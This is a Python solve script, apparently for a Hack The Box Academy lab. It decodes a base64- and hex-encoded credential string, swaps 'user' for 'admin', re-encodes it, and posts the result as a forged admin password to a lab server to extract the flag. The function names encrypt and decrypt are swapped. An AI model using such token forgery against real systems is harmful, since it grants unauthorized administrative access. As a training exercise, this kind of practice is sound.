import requests 
import hashlib 
import re  
import base64


def encrypt(text):
	base_64_decode = base64.b64decode(sample).decode()
	return bytes.fromhex(base_64_decode).decode()

def decrypt(text):
	utf_str = text.encode("utf-8")
	hex_str = utf_str.hex()
	base_64_encode = base64.b64encode(hex_str.encode())
	return base_64_encode.decode("utf-8")


sample = "Njg3NDYyNzU3MzY1NzIzYTY4NzQ2Mjc1NzM2NTcyNDA2MTYzNjE2NDY1NmQ3OTJlNjg2MTYzNmI3NDY4NjU2MjZmNzgyZTY1NzUzYTc1NmU2MjcyNjU2MTZiNjE2MjZjNjU="
encrypt_str = encrypt(sample)
# print(encrypt_str)

admin = re.sub("user", "admin", encrypt_str)
# print(admin)
token = decrypt(admin)

session = requests.Session()
url = "http://139.59.176.158:31810/question2/"
data = {
	"userid": "htbadmin",
	"passwd": token,
	"submit": "submit"
}

r = session.post(url, data=data)
flag = re.findall(r'HTB{(.*)}', r.text)[0]
print("HTB{" + flag + "}")